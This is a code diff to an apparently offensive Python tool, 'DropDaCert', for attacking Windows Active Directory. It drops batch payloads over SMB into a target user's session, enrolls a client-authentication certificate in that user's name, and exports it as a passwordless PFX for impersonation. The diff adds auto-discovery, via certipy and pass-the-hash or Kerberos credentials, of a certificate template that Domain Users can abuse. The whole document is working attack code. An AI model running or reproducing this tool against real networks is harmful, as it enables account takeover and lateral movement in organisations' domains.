@@ -16,6 +16,7 @@ import argparse
 import base64
 import io
 import ipaddress
+import json
 import os
 import re
 import shutil
@@ -23,6 +24,7 @@ import socket
 import struct
 import subprocess
 import sys
+import tempfile
 import time
 import uuid
 import warnings
@@ -98,20 +100,20 @@ CERT_BAT = """\
 setlocal enabledelayedexpansion
 set "BASE={drop_dir}\\{prefix}"
 
-certreq -q -new "%BASE%.inf" "%BASE%.req" >nul 2>"%BASE%.log"
+certreq -q -new "%BASE%.inf" "%BASE%.req" >"%BASE%.log" 2>&1
 if !ERRORLEVEL! neq 0 (echo FAIL_CERTREQ_NEW>"%BASE%.status" & exit /b 1)
 
-certreq -q -submit{ca_flag} "%BASE%.req" "%BASE%.cer" >nul 2>>"%BASE%.log"
+certreq -q -submit{ca_flag} "%BASE%.req" "%BASE%.cer" >>"%BASE%.log" 2>&1
 if not exist "%BASE%.cer" (
     if exist "%BASE%.rsp" (
-        certreq -q -accept "%BASE%.rsp" >nul 2>>"%BASE%.log"
+        certreq -q -accept "%BASE%.rsp" >>"%BASE%.log" 2>&1
         if !ERRORLEVEL! neq 0 (echo FAIL_ACCEPT>"%BASE%.status" & exit /b 1)
         goto :findhash
     )
     echo FAIL_CERTREQ_SUBMIT>"%BASE%.status" & exit /b 1
 )
 
-certutil -user -addstore my "%BASE%.cer" >nul 2>>"%BASE%.log"
+certutil -user -addstore my "%BASE%.cer" >>"%BASE%.log" 2>&1
 if !ERRORLEVEL! neq 0 (echo FAIL_ADDSTORE>"%BASE%.status" & exit /b 1)
 
 :findhash
@@ -125,7 +127,7 @@ for /f "tokens=2 delims=:" %%A in ('certutil -user -store my ^| findstr /r /c:"H
 if "!HASH!"=="" (echo FAIL_NOHASH>"%BASE%.status" & exit /b 1)
 
 certutil -user -repairstore my !HASH! >nul 2>&1
-certutil -user -exportPFX -p "" -f my !HASH! "%BASE%.pfx" NoChain,NoRoot >nul 2>>"%BASE%.log"
+certutil -user -exportPFX -p "" -f my !HASH! "%BASE%.pfx" NoChain,NoRoot >>"%BASE%.log" 2>&1
 certutil -user -delstore my !HASH! >nul 2>&1
 
 if exist "%BASE%.pfx" (
@@ -141,7 +143,7 @@ CERT_BAT_PHASE1 = """\
 @echo off
 setlocal enabledelayedexpansion
 set "BASE={drop_dir}\\{prefix}"
-certreq -q -new "%BASE%.inf" "%BASE%.req" >nul 2>"%BASE%.log"
+certreq -q -new "%BASE%.inf" "%BASE%.req" >"%BASE%.log" 2>&1
 if !ERRORLEVEL! neq 0 (echo FAIL_CERTREQ_NEW>"%BASE%.status" & exit /b 1)
 echo OK_REQ>"%BASE%.status"
 """
@@ -150,7 +152,7 @@ CERT_BAT_PHASE2 = """\
 @echo off
 setlocal enabledelayedexpansion
 set "BASE={drop_dir}\\{prefix}"
-certutil -user -addstore my "%BASE%.cer" >nul 2>"%BASE%.log"
+certutil -user -addstore my "%BASE%.cer" >"%BASE%.log" 2>&1
 if !ERRORLEVEL! neq 0 (echo FAIL_ADDSTORE>"%BASE%.status" & exit /b 1)
 set "HASH="
 for /f "tokens=2 delims=:" %%A in ('certutil -user -store my ^| findstr /r /c:"Hach\\. cert\\." /c:"Cert Hash"') do (
@@ -160,7 +162,7 @@ for /f "tokens=2 delims=:" %%A in ('certutil -user -store my ^| findstr /r /c:"H
 )
 if "!HASH!"=="" (echo FAIL_NOHASH>"%BASE%.status" & exit /b 1)
 certutil -user -repairstore my !HASH! >nul 2>&1
-certutil -user -exportPFX -p "" -f my !HASH! "%BASE%.pfx" NoChain,NoRoot >nul 2>>"%BASE%.log"
+certutil -user -exportPFX -p "" -f my !HASH! "%BASE%.pfx" NoChain,NoRoot >>"%BASE%.log" 2>&1
 certutil -user -delstore my !HASH! >nul 2>&1
 if exist "%BASE%.pfx" (echo OK>"%BASE%.status" & exit /b 0) else (echo FAIL_EXPORT>"%BASE%.status" & exit /b 2)
 """
@@ -961,6 +963,120 @@ def discover_ca(domain, dc_ip, username, password, nt_hash):
     return None
 
 
+def find_best_template(domain, dc_ip, username, password, nt_hash,
+                       ca_config, kerberos=False, aes_key=None):
+    """Auto-discover a certificate template suitable for DropDaCert.
+
+    Needs: Client Auth EKU, Domain Users/Authenticated Users enrollment,
+    enabled on the CA, no manager approval, no co-signatures, and ideally
+    no SubjectRequireEmail flag.
+
+    Returns (template_name, warning) or (None, error_reason).
+    """
+    certipy_bin = shutil.which("certipy-ad") or shutil.which("certipy")
+    if not certipy_bin:
+        return None, "certipy not installed"
+
+    ca_name = ca_config.split("\\")[-1] if "\\" in ca_config else ca_config
+
+    with tempfile.TemporaryDirectory() as tmpdir:
+        prefix = os.path.join(tmpdir, "scan")
+        cmd = [certipy_bin, "find", "-dc-ip", dc_ip,
+               "-json", "-output", prefix]
+
+        if domain:
+            cmd.extend(["-u", f"{username}@{domain}"])
+        else:
+            cmd.extend(["-u", username])
+
+        if password:
+            cmd.extend(["-p", password])
+        elif nt_hash:
+            nt = nt_hash.split(":")[-1]
+            cmd.extend(["-hashes", f":{nt}"])
+
+        if kerberos:
+            cmd.append("-k")
+        if aes_key:
+            cmd.extend(["-aes-key", aes_key])
+
+        try:
+            subprocess.run(cmd, capture_output=True, text=True,
+                           timeout=60, stdin=subprocess.DEVNULL, cwd=tmpdir)
+        except subprocess.TimeoutExpired:
+            return None, "timed out querying LDAP"
+        except Exception as e:
+            return None, str(e)
+
+        json_files = [f for f in os.listdir(tmpdir) if f.endswith(".json")]
+        if not json_files:
+            return None, "no output from certipy"
+
+        with open(os.path.join(tmpdir, json_files[0])) as f:
+            data = json.load(f)
+
+    templates = data.get("Certificate Templates", {})
+    if not isinstance(templates, dict):
+        return None, "unexpected certipy output format"
+
+    candidates = []
+    all_client_auth = []
+
+    for t in templates.values():
+        name = t.get("Template Name", "")
+
+        if not (t.get("Client Authentication", False)
+                or t.get("Any Purpose", False)):
+            continue
+        if not t.get("Enabled", False):
+            continue
+        if t.get("Requires Manager Approval", False):
+            continue
+        if (t.get("Authorized Signatures Required", 0) or 0) > 0:
+            continue
+
+        t_cas = t.get("Certificate Authorities", [])
+        if isinstance(t_cas, str):
+            t_cas = [t_cas]
+        if not any(ca_name in c for c in (t_cas or [])):
+            continue
+
+        enroll_rights = []
+        perms = t.get("Permissions", {})
+        if isinstance(perms, dict):
+            ep = perms.get("Enrollment Permissions", {})
+            if isinstance(ep, dict):
+                er = ep.get("Enrollment Rights", [])
+                if isinstance(er, str):
+                    er = [er]
+                enroll_rights = er or []
+
+        all_client_auth.append(name)
+
+        if not any("Domain Users" in r or "Authenticated Users" in r
+                   for r in enroll_rights):
+            continue
+
+        name_flags = t.get("Certificate Name Flag", [])
+        if isinstance(name_flags, str):
+            name_flags = [name_flags]
+        has_email = any("Email" in f for f in (name_flags or []))
+
+        candidates.append({"name": name, "has_email": has_email})
+
+    if not candidates:
+        if all_client_auth:
+            return None, (f"found Client Auth templates ({', '.join(all_client_auth)}) "
+                          "but none allow Domain Users enrollment")
+        return None, "no templates with Client Auth EKU enabled on this CA"
+
+    no_email = [c for c in candidates if not c["has_email"]]
+    if no_email:
+        return no_email[0]["name"], None
+
+    return candidates[0]["name"], "requires email attribute on target user"
+
+
 # ── Session enumeration ──────────────────────────────────────────────────────
 
 def enum_sessions(transport):
@@ -1164,9 +1280,28 @@ def run_manual_mode(args):
 
     user_domain = args.domain or "DOMAIN"
 
+    # Template selection
+    template = args.template
+    if template is None:
+        if args.domain and args.dc_ip:
+            info("Discovering templates...")
+            template, tmpl_warn = find_best_template(
+                args.domain, args.dc_ip, args.username, args.password,
+                args.nt_hash, args.ca, args.kerberos, args.aes_key)
+            if template:
+                if tmpl_warn:
+                    warn(f"Template '{template}': {tmpl_warn}")
+                info(f"Selected template: {template}")
+            else:
+                template = "User"
+                warn(f"Auto-discovery failed ({tmpl_warn}), using: User")
+        else:
+            template = "User"
+
     os.makedirs(args.out_dir, exist_ok=True)
+    info(f"Generating payload (template: {template})...")
     files = generate_files(
-        target_user, user_domain, args.ca, args.template,
+        target_user, user_domain, args.ca, template,
         args.prefix, args.drop_dir, args.exec_wrapper)
 
     for fname, data in files.items():
@@ -1299,9 +1434,29 @@ def main():
     info(f"Target session: {target_display} "
          f"(session {target_session['id']}, {target_session['state']})")
 
+    # Template selection
+    template = args.template
+    if template is None:
+        query_domain = ad_domain or args.domain
+        if query_domain:
+            info("Discovering templates...")
+            template, tmpl_warn = find_best_template(
+                query_domain, args.dc_ip, args.username, args.password,
+                args.nt_hash, args.ca, args.kerberos, args.aes_key)
+            if template:
+                if tmpl_warn:
+                    warn(f"Template '{template}': {tmpl_warn}")
+                info(f"Selected template: {template}")
+            else:
+                template = "User"
+                warn(f"Auto-discovery failed ({tmpl_warn}), using: User")
+        else:
+            template = "User"
+
     # Generate and upload payload
+    info(f"Generating payload (template: {template})...")
     files = generate_files(
-        target_user, user_domain, args.ca, args.template,
+        target_user, user_domain, args.ca, template,
         args.prefix, args.drop_dir, args.exec_wrapper)
     smb_delete_files(smb, args.drop_dir, args.prefix)
     try:
@@ -1402,8 +1557,8 @@ def parse_args():
     cert = p.add_argument_group("certificate")
     cert.add_argument("-ca", required=True, metavar="HOST\\NAME",
         help="CA config string (e.g. 'CA01.corp.local\\Corp-CA')")
-    cert.add_argument("-template", default="User",
-        help="Certificate template (default: User)")
+    cert.add_argument("-template", "--template", default=None,
+        help="Certificate template (default: auto-discover via certipy, falls back to User)")
 
     tgt = p.add_argument_group("target selection")
     tgt.add_argument("-tu", "--target-user", default=None, metavar="USER",
